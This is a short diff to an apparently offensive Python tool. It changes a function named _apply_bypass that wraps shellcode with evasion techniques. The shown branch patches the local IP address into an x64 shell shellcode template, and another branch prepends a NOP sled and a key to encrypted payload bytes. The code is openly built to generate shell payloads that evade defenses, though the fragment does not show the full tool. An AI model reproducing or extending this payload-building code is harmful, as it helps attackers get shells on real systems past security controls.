@@ -642,7 +642,15 @@ def _apply_bypass(shellcode: bytes, technique: str, target_os: str) -> bytes:
         return NOP_SLED + bytes(key) + bytes(encrypted)
 
     elif technique == "syscall":
-        parts = [int(p) for p in os.popen("hostname -I 2>/dev/null || echo 127.0.0.1").read().strip().split(".")]
+        import socket
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip_str = s.getsockname()[0]
+            s.close()
+        except Exception:
+            ip_str = "127.0.0.1"
+        parts = [int(p) for p in ip_str.split(".")]
         ip_bytes = bytes(reversed(parts[:4])) if len(parts) >= 4 else b"\x7f\x00\x00\x01"
         sc = bytearray(SYSCALL_SHELL_X64)
         ip_offset = sc.find(b"\x00\x00\x00\x00\x00\x00\x00\x00")
